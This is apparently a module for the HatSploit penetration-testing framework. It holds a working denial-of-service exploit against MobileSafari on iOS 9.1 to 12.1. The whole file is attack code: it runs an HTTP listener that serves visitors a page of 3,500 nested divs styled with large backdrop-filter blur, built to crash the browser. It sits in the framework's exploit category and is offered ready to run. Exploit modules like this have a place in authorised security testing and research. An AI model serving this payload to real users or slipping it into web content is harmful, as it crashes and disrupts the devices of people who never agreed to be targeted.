"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.module.basic import *
from hatsploit.lib.module.proto import HTTP


class HatSploitModule(Module, HTTP):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Category': "exploit",
            'Name': "iOS Safari WebKit Filter DoS",
            'Module': "exploit/apple_ios/safari/webkit_filter_dos",
            'Authors': [
                'Ivan Nikolsky (enty8080) - module developer',
                'Sabri Haddouche (pwnsdx) - vulnerability researcher',
            ],
            'Description': "iOS 9.1 till 12.1 MobileSafari.app WebKit Filter DoS.",
            'Platform': "apple_ios",
            'Rank': "high",
        })

        self.urlpath = Option("/", "File path on server", True)

    def run(self):
        def get(request):
            if request.path == self.urlpath.value:
                self.print_process("Delivering payload...")

                request.send_response(200)
                request.send_header("Content-type", "text/html")
                request.end_headers()

                request.wfile.write(
                    (
                        "<html>"
                        "    <head>"
                        "        <meta content=\"text/html; charset=utf-8\" http-equiv=\"Content-Type\"/>"
                        "        <style>"
                        "            div {"
                        "                backdrop-filter: blur(10px);"
                        "                -webkit-backdrop-filter: blur(10px);"
                        "                width:10000px; height:10000px;"
                        "            }"
                        "        </style>"
                        "    </head>"
                        "    <body>"
                        f"        {'<div>' * 3500 + '</div>' * 3500}"
                        "    </body>"
                        "</html>"
                    ).encode()
                )

        self.listen_http(methods={'GET': get})
